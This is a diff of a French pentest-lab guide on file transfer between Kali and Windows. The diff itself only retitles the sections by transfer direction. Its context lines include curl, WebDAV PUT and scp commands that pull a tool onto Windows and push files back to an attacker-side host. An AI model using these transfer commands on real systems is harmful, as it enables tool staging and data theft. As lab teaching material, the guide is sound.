@@ -174,7 +174,7 @@ curl.exe -fL 'http://10.10.14.10:8000/outil.exe' -o 'C:\Users\Public\outil.exe'
 
 **Important :** `python3 -m http.server` fournit des fichiers par **GET**. Il **ne reçoit pas** un téléversement `POST` ou `PUT` sans implémentation supplémentaire.
 
-### Alternative : SMB depuis Kali
+### Linux → Windows : récupérer un fichier depuis le partage SMB de Kali
 
 **Sur Kali :** créer un partage SMB authentifié. Le port SMB 445 nécessite généralement `sudo` pour être ouvert par un processus local.
 
@@ -194,7 +194,7 @@ net use \\10.10.14.10\partage /delete
 
 Le mot de passe affiché n'est qu'un exemple : utiliser un identifiant dédié au laboratoire.
 
-### Autres possibilités vers Windows
+### Linux → Windows : envoyer vers un partage SMB ou via SSH
 
 **Si Windows possède un partage SMB `Depot` en écriture**, depuis Linux :
 
@@ -237,7 +237,7 @@ Copy-Item 'C:\Users\Public\rapport.txt' '\\10.10.14.10\partage\rapport.txt'
 net use \\10.10.14.10\partage /delete
 ```
 
-### Alternative : WebDAV en réception
+### Windows → Linux : envoyer un fichier avec WebDAV
 
 **Sur Kali :** un serveur WebDAV accepte des requêtes PUT et peut recevoir des fichiers. L'exemple utilise un accès **anonyme et non chiffré**, réservé à un laboratoire isolé.
 
@@ -252,7 +252,7 @@ wsgidav -H 0.0.0.0 -p 8080 -r ./reception --auth anonymous
 curl.exe -T 'C:\Users\Public\rapport.txt' 'http://10.10.14.10:8080/rapport.txt'
 ```
 
-### Alternative : SCP depuis Windows
+### Windows → Linux : envoyer un fichier avec SCP
 
 **Sur Windows :** si le **serveur SSH de Kali** est accessible et si OpenSSH Client est installé.
 
@@ -260,7 +260,7 @@ curl.exe -T 'C:\Users\Public\rapport.txt' 'http://10.10.14.10:8080/rapport.txt'
 scp 'C:\Users\Public\rapport.txt' kali@10.10.14.10:/tmp/rapport.txt
 ```
 
-### Récupérer depuis un partage Windows
+### Windows → Linux : récupérer un fichier depuis un partage SMB
 
 **Sur Kali :** si Windows expose déjà le partage `Depot` avec un droit de lecture.
 
